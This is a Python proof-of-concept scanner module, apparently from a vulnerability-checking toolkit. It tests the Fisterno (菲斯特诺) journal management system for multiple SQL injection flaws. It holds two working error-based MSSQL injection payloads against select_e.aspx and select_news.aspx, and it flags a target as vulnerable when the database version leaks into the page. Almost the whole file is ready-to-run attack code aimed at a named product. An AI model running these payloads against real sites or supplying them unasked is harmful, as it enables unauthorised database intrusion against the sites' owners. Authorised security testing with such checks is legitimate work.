#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 菲斯特诺期刊系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0125186
         http://www.wooyun.org/bugs/wooyun-2010-0116361
author: Lucifer
description: 菲斯特诺期刊系统多处SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class newedos_multi_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/select_e.aspx?type=zzdw&content=1%27AnD%20ChAr(ChAr(74)%2BChAr(73)%2B@@VeRsIoN)<0--",
                    "/select_news.aspx?type=1&content=1/**//'/**/AnD/**/ChAr(ChAr(74)%2BChAr(73)%2B@@VeRsIon)/**/>0",]
        try:
            noexist = True
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"JIMicrosoft" in req.text:
                    cprint("[+]存在菲斯特诺期刊系统多处SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                    return True, vulnurl, "菲斯特诺期刊系统多处SQL注入", payload, req.text
            if noexist:
                cprint("[-]不存在newedos_multi_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = newedos_multi_sqli_BaseVerify(sys.argv[1])
    testVuln.run()